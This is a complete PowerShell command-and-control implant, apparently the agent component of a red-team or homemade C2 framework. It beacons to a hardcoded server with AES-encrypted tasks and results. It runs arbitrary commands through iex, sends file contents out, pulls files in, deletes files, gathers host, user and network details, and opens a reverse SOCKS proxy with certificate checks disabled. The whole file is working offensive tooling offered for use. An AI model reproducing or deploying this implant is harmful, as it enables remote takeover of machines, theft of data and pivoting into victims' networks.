$implant_id = "5"
$key = [System.Convert]::FromBase64String("k+REtlRcipkMkVW89B0j/RIN3rjxydFeGQ1QoldKypo=")
$iv = [System.Convert]::FromBase64String("tItX91yHRvj6EkVNFcRStQ==")
# ipconfig-all - the results of the ipconfig /all command
function func_ipconfig 
{
    $results = ipconfig /all | Out-String
    return $results

}
# download - gets the file content on disk and stores it in results so 
# we can send it over to the C2 server
function func_download 
{
    param([string] $file_path) # the file path on disk we want to download
    
    $results = Get-Content -Path $file_path -Raw

    return $results
}

# upload - gets a file from the C2 server and saves to disk
function func_upload 
{
    param([string] $file_path) # the uri to get from, and the place to save to

    

    if($file_path.Length -lt 1)
    {
        $file_path = "upload"
    }
    else
    {
        # allows us to consider spaces since this is our only argument
        $temp = $file_path -split ';' -join ' '

        $file_path = "`"$temp`""
    }
    
    Invoke-RestMethod -Uri "$protocol//$ip/$upload_uri/$implant_id" -OutFile $file_path
}
# get-dir - performs an ls and returns the results
function func_dir
{
    param([string] $directory) # the directory or file we are enumerating

    # converts the output of "ls" to a string and returns it
    $results = ls $directory | Out-String
    $res2 = $results.ToString()

    return $res2
    
}
# get-pwd - performs a pwd command and returns the results
function func_pwd
{

    # returns the pwd results as a powershell string variable    
    $results = pwd | Out-String
    $res2 = $results.ToString()

    return $results
}
# change-dir - changes the current directory. returns that we tried to change directories
function func_cd 
{
    param([string] $directory) # the directory we are going to change to

    cd $directory
    return "Attempted to change to $directory."
}
# rm-time - removes the specific item or directory and returns that we tried to remove the item
function func_rm 
{
    param([string] $item) # the item we want to remove

    rm $item

    return "Attempted to remove $item."

}
# netstat-tcp - enumerates tcp connections and returns the output
function func_netstat-tcp 
{
   $results = Get-NetTCPConnection | Out-String
   return $results
}
# whoami-all - the results of the whoami /all command
function func_whoami 
{
    $results = whoami /all | Out-String
    return $results
}
﻿# main block for socks connections
[ScriptBlock]$SocksConnectionMgr = {
    param( $vars )
    
    # copies the vars so they can be used in the runspace
    $Script = 
    {
            param( $vars )
            $vars.inStream.CopyTo($vars.outStream)
            Exit
    }

    $rsp = $vars.rsp

    # defines the get ip address function. this resolves ip address from domain name if needed
    function func_get_ipaddress 
    {
        param($socks_ip)
        if ($socks_ip -as [ipaddress])
        {
            return $socks_ip
        }
        else
        {
            $socks_ip2 = [System.Net.Dns]::GetHostAddresses($socks_ip)[0].IPAddressToString
        }
        return $socks_ip2
    }

    # gets the client and buffer from the vars
    $client = $vars.cliConnection
    $buffer_small = New-Object System.Byte[] 32


    try
    {
        # reads the buffer
        $cliStream = $vars.cliStream
        $cliStream.Read($buffer_small, 0, 2) | Out-Null

        # per protocol, the first byte is supposed to be the socks buffer
        $socksVer = $buffer_small[0]
        
        # if it is a socks5 proxy
        if ($socksVer -eq 5)
        {
            # performs socks5 protocol
            $cliStream.Read($buffer_small, 2, $buffer_small[1]) | Out-Null
            for ($ctr = 2; $ctr -le $buffer_small[1] + 1; $ctr++) 
            {
                if ($buffer_small[$ctr] -eq 0) {break}
            }
            if ($buffer_small[$ctr] -ne 0)
            {
                $buffer_small[1] = 255
                $cliStream.Write($buffer_small, 0, 2)
            }
            else
            {
                $buffer_small[1] = 0
                $cliStream.Write($buffer_small, 0, 2)
            }

            $cliStream.Read($buffer_small, 0, 4) | Out-Null
            $cmd = $buffer_small[1]
            $atyp = $buffer_small[3]

            if($cmd -ne 1)
            {
                $buffer_small[1] = 7
                $cliStream.Write($buffer_small, 0, 2)
                throw "Not a connect"
            }

            if($atyp -eq 1)
            {
                $socks_ipv4 = New-Object System.Byte[] 4
                $cliStream.Read($socks_ipv4, 0, 4) | Out-Null
                $socks_ipAddress = New-Object System.Net.IPAddress(,$socks_ipv4)
                $hostName = $socks_ipAddress.ToString()
            }
            elseif($atyp -eq 3)
            {
                $cliStream.Read($buffer_small, 4, 1) | Out-Null
                $hostBuff = New-Object System.Byte[] $buffer_small[4]
                $cliStream.Read($hostBuff, 0, $buffer_small[4]) | Out-Null
                $hostName = [System.Text.Encoding]::ASCII.GetString($hostBuff)
            }
            else
            {
                $buffer_small[1] = 8
                $cliStream.Write($buffer_small, 0, 2)
                throw "Not a valid destination address"
            }

            $cliStream.Read($buffer_small, 4, 2) | Out-Null
            $destPort = $buffer_small[4] * 256 + $buffer_small[5]
            $destHost = func_get_ipaddress($hostName)

            if($destHost -eq $null)
            {
                $buffer_small[1] = 4
                $cliStream.Write($buffer_small,0,2)
                throw "Cant resolve destination address"
            }

            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)

            if($tmpServ.Connected)
            {
                $buffer_small[1] = 0
                $buffer_small[3] = 1
                $buffer_small[4] = 0
                $buffer_small[5] = 0
                $cliStream.Write($buffer_small, 0, 10)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream() 
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyToAsync($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne()
                $AsyncJobResult2.AsyncWaitHandle.WaitOne()
                
            }
            else
            {
                $buffer_small[1] = 4
                $cliStream.Write($buffer_small, 0, 2)
                throw "Cant connect to host"
            }
       }
       elseif($socksVer -eq 4)
       {
            $cmd = $buffer_small[1]
            if($cmd -ne 1)
            {
                $buffer_small[0] = 0
                $buffer_small[1] = 91
                $cliStream.Write($buffer_small, 0, 2)
                throw "Not a connect"
            }
            $cliStream.Read($buffer_small, 2, 2) | Out-Null
            $destPort = $buffer_small[2] * 256 + $buffer_small[3]
            $socks_ipv4 = New-Object System.Byte[] 4
            $cliStream.Read($socks_ipv4, 0, 4) | Out-Null
            $destHost = New-Object System.Net.IPAddress(,$socks_ipv4)
            $buffer_small[0] = 1
            while ($buffer_small[0] -ne 0){
                $cliStream.Read($buffer_small, 0, 1)
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)
            
            if($tmpServ.Connected)
            {
                $buffer_small[0] = 0
                $buffer_small[1] = 90
                $buffer_small[2] = 0
                $buffer_small[3] = 0
                $cliStream.Write($buffer_small, 0, 8)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream() 
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyTo($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne()
                $AsyncJobResult2.AsyncWaitHandle.WaitOne()
            }
       }
       else
       {
            throw "Unknown socks version"
       }
    }
    catch {
        #$_ >> "error.log"
    }
    finally 
    {
        if ($client -ne $null) 
        {
            $client.Dispose()
        }
        if ($tmpServ -ne $null) 
        {
            $tmpServ.Dispose()
        }
        Exit;
    }
}

# reverse socks proxy function
function func_socks{

    # parameters that we'll want. this just requires that you give it the host that is handling reverse socks
    # connections and the port on which it is handling those connections
    param ( [String] $remote_host,
            [Int] $remote_port,
            [String] $cert_fingerprint = "",
            [Int] $threads = 200,
            [Int] $max_retries = 0 )

    # everything here is wrapped in a try block in case we error out
    try 
    {

        # initializes a try counter, current_try
        $current_try = 0

        # initializes a runspace pool, this is a powershell session that can run many threads at once
        $rsp = [runspacefactory]::CreateRunspacePool(1, $threads)
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30
        $rsp.open()

        # while we have not tried more than 5 times to connect to the remote host
        while($current_try -lt 5)
        {
            # verbose mode writes that we have connected successfully to the server
            Write-Host "Connecting to: " $remote_host ":" $remote_port

            # in another try block
            try
            {
                # creates a new tcp client for us to connect to
                $client = New-Object System.Net.Sockets.TcpClient($remote_host, $remote_port)
                $clear_clistream = $client.GetStream()
                
                if($cert_fingerprint -eq '')
                {
                    $cliStream = New-Object System.Net.Security.SslStream($clear_clistream, $false, ({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                else
                {
                    $cliStream = New-Object System.Net.Security.SslStream($clear_clistream, $false, ({return $args[1].GetCertHashString() -eq $cert_fingerprint } -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                
                # authenticates using TLSv1.2
                $cliStream.AuthenticateAsClient($remote_host, $null, [Net.SecurityProtocolType]::Tls12, $false)
                
                # verbose mode, writes connected at this point
                Write-Host "Connected"

                # the first thing this does is send a "fake" HTTP reqeuest over the connection, then whenever there is
                # something to be proxied, we'll get a Hello

                # every time we successfully connect, reset current try
                $current_try = 0

                # initializes buffers for the hello and buffers for the fake request
                # buffer_small will be used for our proxy connections, while buffer_large will be used for our initial connection
                $buffer_small = New-Object System.Byte[] 32
                $buffer_large = New-Object System.Byte[] 122

                # establishes the fake request
                $est_request = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $remote_host + "`n`n")
                # writes the establishment reqeuest to the buffer
                $cliStream.Write($est_request, 0, $est_request.Length)
                
                # sets the read timeout and attempts to read the establishment request into the larger buffer
                $cliStream.ReadTimeout = 1000
                $cliStream.Read($buffer_large, 0, 122) | Out-Null
                
                # reads the message after
                $cliStream.Read($buffer_small, 0, 5) | Out-Null
                
                # converst the small buffer message to text
                $message = [System.Text.Encoding]::ASCII.GetString($buffer_small)
                
                # verbose mode writes the message to the terminal
                Write-Host $message

                # handle whether or not the hello message was sent back successfully
                if($message -ne "HELLO")
                {
                    throw "No Client connected"
                }
                else
                {
                    Write-Host "Connection received"
                }


                $cliStream.ReadTimeout = 100000

                # initializes a powershell runspace to handle the socks connection after it's established
                $vars = [PSCustomObject]@{"cliConnection" = $client ; "rsp" = $rsp ; "cliStream" = $cliStream }
                $PS3 = [PowerShell]::Create()
                $PS3.RunspacePool = $rsp;
                $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
                $PS3.BeginInvoke() | Out-Null

            }
            catch
            {
                $current_try = $current_try + 1;
                # if (($max_retries -ne 0) -and ($current_try -eq $max_retries)){
                #     Throw "Cannot connect to handler, max Number of attempts reached, exiting";
                # }
                # if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "The remote certificate is invalid according to the validation procedure."')
                # {
                #     throw $_
                # }
                # if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "Authentication failed because the remote party has closed the transport stream."')
                # {
                #     sleep 5
                # }

                # if (($_.Exception.Message.Length -ge 121) -and $_.Exception.Message.substring(0,120) -eq 'Exception calling ".ctor" with "2" argument(s): "No connection could be made because the target machine actively refused')
                # {
                #     sleep 5
                # }
                try
                {
                    $client.Close()
                    $client.Dispose()
                }
                catch{}
                    sleep -Milliseconds 1
            }
        }
    }
    catch
    {
        throw $_;
    }
    finally
    {
        # when we're done, writes that the server is closed
        write-host "Server closed."

        # cleans up everything
        if ($client -ne $null) 
        {
            $client.Dispose()
            $client = $null
        }
        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) 
        {
            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}

# shell - runs a cmd.exe command for us, the way we can start arbitrary processes and get output
function func_iex
{
    param([string] $args)

    # runs the shell command and gets the results as a string
    $results = (($args | iex) | Out-String)
    $res2 = $results.ToString()

    return $res2
}

function func_pick_job
{
    param([string]$job,     
        [string]$job_args,   
        [string]$lcl_ip)            

    # picks the job and executes the command
    if ($job -eq "exit" -or $job -eq "checkin")
    {
        $results = ""
    }
	elseif($job -eq "ipconfig")
	{
		$results = func_ipconfig 
	}
	elseif($job -eq "download")
	{
		$results = func_download $job_args
	}
	elseif($job -eq "upload")
	{
		$results = func_upload $job_args
	}
	elseif($job -eq "dir")
	{
		$results = func_dir $job_args
	}
	elseif($job -eq "pwd")
	{
		$results = func_pwd 
	}
	elseif($job -eq "cd")
	{
		$results = func_cd $job_args
	}
	elseif($job -eq "rm")
	{
		$results = func_rm $job_args
	}
	elseif($job -eq "netstat-tcp")
	{
		$results = func_netstat-tcp 
	}
	elseif($job -eq "whoami")
	{
		$results = func_whoami 
	}
	elseif($job -eq "socks")
	{
		$results = func_socks $lcl_ip $job_args
	}
	elseif($job -eq "iex")
	{
		$results = func_iex $job_args
	}

	else
	{
		$results = '[!] Invalid Command'
	}

	return $results
}

$ip = "192.168.11.130:5000"
$task_uri = "tasks"
$result_uri = "results"
$upload_uri = "upload"
$max_data_size = "4096"
$sleep = "3"
$jitter = "0.5"
$protocol = "http:"
###############################################################################

# when we send GET and POST requests, we have default headers, this is used to obfuscate HTTP(S) traffic
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Content-Type", "application/json")

# implant crypto functions
Add-Type -AssemblyName System.Security

# added for self signed certs
try{

# adds the ability to discard self signed certs
add-type @"
     using System.Net;
     using System.Security.Cryptography.X509Certificates;
     public class TrustAllCertsPolicy : ICertificatePolicy {
         public bool CheckValidationResult(
             ServicePoint srvPoint, X509Certificate certificate,
             WebRequest request, int certificateProblem) {
             return true;
         }
     }
"@
[System.Net.ServicePointManager]::CertificatePolicy = new-object TrustAllCertsPolicy
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
}
catch{ throw $_; }

# function to decrypt aes 
function func_aes_decrypt
{
  param($text1, $key1, $iv1)

    # creates a new aes object
    $aes1 = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes1.Key = $key1
    $aes1.IV = $iv1
    $aes1.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes1.CreateDecryptor()

    # decrypts
    $decryptedData = $decryptor.TransformFinalBlock($text1, 0, $text1.Length)

    return $decryptedData
}

# function to aes encrypt
function func_aes_encrypt
{
    param($text2, $key2, $iv2)

    # creates a new aes object
    $aes2 = [System.Security.Cryptography.Aes]::Create()
    $aes2.Key = $key2
    $aes2.IV = $iv2
    $aes2.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes2.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $encryptor = $aes2.CreateEncryptor()

    $encryptedBytes = $encryptor.TransformFinalBlock($text2, 0, $text2.Length)
    $aes2.Dispose()

    # encrypts and encodes
    $encryptedText = [System.Convert]::ToBase64String($encryptedBytes)

    return $encryptedText

}

function func_verify_task
{
    # the string of "task_id,task_type,task_opt" that tells us what to do
    param($task_string, 
        # the hash of the task_string, encrypted with the server's key
          $digest,  
        # the key that we'll use to decrypt the hash and verify the sig
          $key3, $iv3)         

   
   # verify signature
   $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($task_string))

   $digest_dec = func_aes_decrypt $digest $key3 $iv3

   # compares the digest byte by byte to make sure it is the same
   $verified = 1
   for($counter = 0; $counter -lt $msg_digest.Length; $counter++)
   {        
        if($msg_digest[$counter] -ne $digest_dec[$counter])
        {
            $verified = 0
        }
   }

   # returns the status of signature verification
   return $verified
}

function func_sign_results
{
     # the string we want to send to the server the key we'll use to sign
    param($results_str,
          $key4, $iv4)         

    # performs signature algorithm
    $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($results_str))
    
    # encrypts the message digest
    $sig_digest = func_aes_encrypt $msg_digest $key4 $iv4


    # returns the signature
    return $sig_digest
}


## CHUNKING FUNCTION
# chunk - used to chunk response into sendable strings instead of one large piece of data
function func_chunk
{

# the data that we're going to chunk
# the current byte that we're starting the next chunk at
# the maximum size of the chunk
    param([string]$data,        
          [int]$current_byte,     
          [int]$max_data_size)    


    # gets where to start the chunk, as in do we send the rest of the data, or a subset
    # of the rest of the data
    $chunk_bound = [Math]::Min($max_data_size, $data.Length-$current_byte)

    # slices the string based on what we calculated
    $results_chunk = $data.SubString($current_byte, $chunk_bound)

    # shifts the current byte variable to where we left off
    $new_current_byte = $chunk_bound + $current_byte
    
    # if our new "current byte" is the end of the results string, we can be done sending data
    if($new_current_byte -ge $data.Length)
    {
        # flips this value to true
        $new_current_byte = "true"
    }

    # sends the results and current byte
    return "$results_chunk<chnk>$new_current_byte"
}

## HELPER FUNCTIONS

function func_sa
{

    # ip addresses
    $results_str = ""

    $ip_str = ((Get-NetIPConfiguration | Select-Object InterfaceAlias, Ipv4Address) | Out-String)
    # MAC addresses
    $mac_str = ((Get-NetAdapter | Select-Object Name, MacAddress, Status) | Out-String)
    # DHCP enabled or not
    $dhcp_str = ((Get-NetIPInterface | Select-Object InterfaceAlias, Dhcp) | Out-String)
    # hostname
    $hostname_str = [System.Net.Dns]::GetHostName()
    # username
    $username_str = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    # domain name
    $domain_str = (Get-CimInstance Win32_ComputerSystem).Domain
    # FQDN
    $fqdn_str = [System.Net.Dns]::GetHostEntry("").HostName
    # pid and ppid
    $pid_str = (Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" | Select-Object ProcessId).ProcessId
    $ppid_str = (Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" | Select-Object ParentProcessId).ParentProcessId

    $results_str = "$ip_str<sa>$mac_str<sa>$dhcp_str<sa>$hostname_str<sa>$username_str<sa>$domain_str<sa>$fqdn_str<sa>$pid_str<sa>$ppid_str"

    return $results_str
}

# func_get_tasks - used to get tasks from the C2 server and then parse them into the jobs format
function func_get_tasks 
{

    # temp variable that will store the final job format after we parse the task
    $temp = ""

    # make get request to /tasks/implant_id; being served pending tasks for our specific implant
    $raw_tasks = Invoke-RestMethod "$protocol//$ip/$task_uri/$implant_id" -Method 'GET' -Headers $headers

    # split the tasks into separate lines and store in varaible task_list
    $tasks_list = $raw_tasks -split '\n'

    # parse each task we're being served
    foreach ($tasks_enc in $tasks_list)
    {

        # if the task has a value (length is greater than 0), splits the task into
        # its component values and reassembles into job format
        if($tasks_enc.Length -gt 0)
        {
            # decodes the task from base64
            $tmp = [System.Convert]::FromBase64String($tasks_enc)
            $tmp = func_aes_decrypt $tmp $key $iv
            $task = [System.Text.Encoding]::UTF8.GetString($tmp)


            # splits the task string and parses
            $task = $task -split ','
            $task_id = $task[0]
            $task_type = $task[1]
            $task_options = $task[2]
            $digest2 = [System.Convert]::FromBase64String($task[3])

            # reconstructs the string that was digitally signed
            $sign_verify_test = "$task_id,$task_type,$task_options"
            $is_verified = func_verify_task $sign_verify_test $digest2 $key $iv

            if($is_verified)
            {

                # job format is task_id, task we're executing, parameters for that task, and then bytes sent so far
                # bytes sent = 0 means the task hasn't been sent yet, and "true" means that we're totally completed
                # and the task can be removed
                $temp += "$task_id<br>$task_type<br>$task_options<br>0<br><end>"
            }
        }
    }

    # returns the final job string so it can be appended.
    return $temp

}

# execute_jobs - used to loop through a jobs list, perform the job, and then chunk & send the results
# also pops the job off the array if we've sent all the data associated with it
function func_execute_jobs
{
    # jobs_list - the list of job strings that we use to determine what commands to execute
    param($list_of_jobs)

    # creates an empty array. we'll add jobs that have run, but we haven't completed yet.
    # this allows us to easily discard jobs that have completed.
    $final_job_list = @()

    # for job in job_list
    for ($counter = 0; $counter -lt $list_of_jobs.Length; $counter++)
    {

        
        # perform job, give update to is_completed flag on the progress of the job
        # implant functions should return, results, and progress completed.
        # every response will need to be chunked IAW the max_data_size variable

        # takes the current job and stores it in a local variable
        $job = $list_of_jobs[$counter]

        # perform checks to make sure it is not a null entry
        if($job.Length -gt 0)
        {

            # splits up job string into different varaibles
            $task_vals = $job -split '<br>'
    
            # task_id = first value
            $task_id = $task_vals[0]
            # task_type = second value
            $task_type = $task_vals[1]
            # task_options = third value
            $task_options = $task_vals[2]
            # current_byte, how much of the job results we have currently sent is the fourth value
            $current_byte = $task_vals[3]
            
            # if current_byte is zero, it means that we have not sent any data related to the job yet,
            # AKA the job has not yet run
            if($current_byte -eq 0)
            {

                # gets the results from the pick_job function, this takes the task_type and options and
                # uses type to call the appropriate function to execute the specified task
                $results = func_pick_job $task_type $task_options ($ip -split ":")[0]

            }
            # if the current byte is not equal to zero then we shold already have the results stored, so
            # goes through and gets the stored results so we don't rerun
            else
            {
                # gets the results that we've stored
                $results = $task_vals[4]
            }
            

            # chunks the results according to our max_data_size and current byte we've sent up to
            $results_chunk = (func_chunk $results $current_byte $max_data_size) -split "<chnk>"

            # assembles the response by parsing the results of the chunk command
            $results_send = $results_chunk[0]
            $current_byte = $results_chunk[1]

            # gets the current zulu time for the database
            $result_time = Get-Date -UFormat "%Y%m%d %H:%M:%S UTC"

            $sa_str = func_sa

            # assembles the results string (task_id, results, result_time)
            $response_str = "$task_id<br>$results_send<br>$result_time<br>$sa_str"

            # encode
            $digest2 = func_sign_results $response_str $key $iv
            $tmp = [System.Text.Encoding]::UTF8.GetBytes("$response_str<br>$digest2")
            $final_response = func_aes_encrypt $tmp $key $iv


            # return secured response to the teamserver
            Invoke-RestMethod "$protocol//$ip/$result_uri/$implant_id" -Method 'POST' -Headers $headers -Body $final_response
            # if we have decided to exit
            if($task_type -eq "exit")
            {
                # quits the implant. we do this after we post to the C2 server so we can provide the feedback
                # that we're exiting
                exit
            }

            
            # if we still have results to send
            if($current_byte -ne "true")
            {
                # assembles the jobs array again
                $list_of_jobs[$counter] = "$task_id<br>$task_type<br>$task_options<br>$current_byte<br>$results"
                # appends to the job list we persist for future runs
                $final_job_list += $list_of_jobs[$counter]
            }

            
        }

    }

    # returns the final job list so we can persist unfinished jobs over multiple loops
    return $final_job_list
}


# main - contains the main loop that we'll use for running the implant over the long run
function func_main
{

    # jobs_list array
    $list_of_jobs = @()

    # while True:
    while($true)
    {

        # gets our tasks
        $temp = ((func_get_tasks $ip, $task_uri $list_of_jobs) -split '<end>') | Select-Object -SkipLast 1

        # if we have tasks to add, put them in the jobs list
        if($temp.Length -gt 0)
        {
            $list_of_jobs += $temp
        }

        # execute_jobs and send chunked results
        $list_of_jobs = @(func_execute_jobs $list_of_jobs)


        # sleeps the implant
        # generate a random value between jitter*sleep and sleep.
        $sleep_val = Get-Random -Minimum ((1-$jitter)*$sleep) -Maximum $sleep
        Start-Sleep -Seconds $sleep_val

    }
}

func_main